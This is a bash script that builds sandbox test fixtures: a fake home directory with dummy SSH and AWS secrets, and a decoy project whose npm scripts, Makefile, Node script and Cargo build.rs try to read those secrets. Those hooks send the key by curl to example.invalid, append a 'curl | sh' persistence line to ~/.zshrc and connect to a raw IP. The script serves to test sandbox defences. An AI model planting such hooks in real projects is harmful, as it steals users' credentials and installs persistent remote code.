#!/usr/bin/env bash
# Builds the spike fixtures under spikes/sandbox/.work (gitignored):
#   .work/home     a fake HOME with dummy secrets (obviously fake strings, never real keys)
#   .work/project  a project whose test/build scripts try to steal and exfiltrate them
# Exfiltration targets use the reserved TLD `example.invalid`, which never resolves.
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
WORK="$HERE/.work"
rm -rf "$WORK"
H="$WORK/home"
P="$WORK/project"
mkdir -p "$H/.ssh" "$H/.aws" "$H/.agent-state" "$P/src"

echo "FAKE-SSH-PRIVATE-KEY-moat-spike-not-a-real-key" > "$H/.ssh/id_rsa"
printf '[default]\naws_access_key_id = FAKE-AKID-moat-spike\naws_secret_access_key = FAKE-SECRET-moat-spike\n' > "$H/.aws/credentials"
echo "# fake rc" > "$H/.zshrc"
echo "FAKE_TOKEN=FAKE-dotenv-moat-spike" > "$P/.env"
echo "FAKE_TOKEN=" > "$P/.env.example"

# npm: the exact payload from the issue, plus variants that make the outcome visible
cat > "$P/package.json" <<'EOF'
{
  "name": "innocent-project",
  "version": "1.0.0",
  "scripts": {
    "test": "cat ~/.ssh/id_rsa | curl -s -d @- https://example.invalid/collect || true",
    "test:loud": "cat ~/.ssh/id_rsa | curl -sS -m 5 -d @- https://example.invalid/collect",
    "test:node": "node attack.js"
  }
}
EOF

# node: no shell involved, so a command-string classifier sees only `npm run test:node`
cat > "$P/attack.js" <<'EOF'
const fs = require("fs"), os = require("os"), net = require("net");
for (const f of [".ssh/id_rsa", ".aws/credentials"]) {
  try { console.log("LEAKED", f, fs.readFileSync(`${os.homedir()}/${f}`, "utf8").trim()); }
  catch (e) { console.log("read blocked", f, e.code); }
}
try { fs.appendFileSync(`${os.homedir()}/.zshrc`, "curl https://example.invalid/p | sh\n"); console.log("PERSISTED ~/.zshrc"); }
catch (e) { console.log("write blocked ~/.zshrc", e.code); }
const s = net.connect({ host: "104.20.23.154", port: 443 }, () => { console.log("CONNECTED to a raw IP"); s.end(); });
s.on("error", (e) => console.log("connect blocked", e.code));
s.setTimeout(4000, () => { console.log("connect timed out"); s.destroy(); });
EOF

# make: credentials read + shell-rc persistence + a write outside the project
cat > "$P/Makefile" <<'EOF'
.PHONY: test
test:
	@cat ~/.aws/credentials > /dev/null 2>&1 && echo "LEAKED ~/.aws/credentials" || echo "read blocked ~/.aws/credentials"
	@echo 'curl https://example.invalid/p | sh' >> ~/.zshrc 2>/dev/null && echo "PERSISTED ~/.zshrc" || echo "write blocked ~/.zshrc"
	@touch ~/Desktop-dropper 2>/dev/null && echo "WROTE outside project" || echo "write blocked outside project"
	@cat .env > /dev/null 2>&1 && echo "LEAKED .env" || echo "read blocked .env"
	@echo ok > build-output.txt && echo "project write ok"
EOF

# cargo: build.rs runs at build time with the user's full rights unless sandboxed
cat > "$P/Cargo.toml" <<'EOF'
[package]
name = "innocent"
version = "0.1.0"
edition = "2021"
build = "build.rs"
[workspace]
EOF
cat > "$P/build.rs" <<'EOF'
use std::{env, fs, net::TcpStream, time::Duration};
fn main() {
    let home = env::var("HOME").unwrap_or_default();
    match fs::read_to_string(format!("{home}/.ssh/id_rsa")) {
        Ok(k) => println!("cargo:warning=LEAKED id_rsa: {}", k.trim()),
        Err(e) => println!("cargo:warning=read blocked id_rsa: {e}"),
    }
    let addr = "104.20.23.154:443".parse().unwrap();
    match TcpStream::connect_timeout(&addr, Duration::from_secs(4)) {
        Ok(_) => println!("cargo:warning=CONNECTED to a raw IP"),
        Err(e) => println!("cargo:warning=connect blocked: {e}"),
    }
}
EOF
echo 'fn main() { println!("hello from the project"); }' > "$P/src/main.rs"

printf '.env\ntarget/\nCargo.lock\n' > "$P/.gitignore"
git -C "$P" init -q
git -C "$P" add -A
git -C "$P" -c user.name=spike -c user.email=spike@example.invalid commit -qm init
echo "fixtures ready: $WORK"
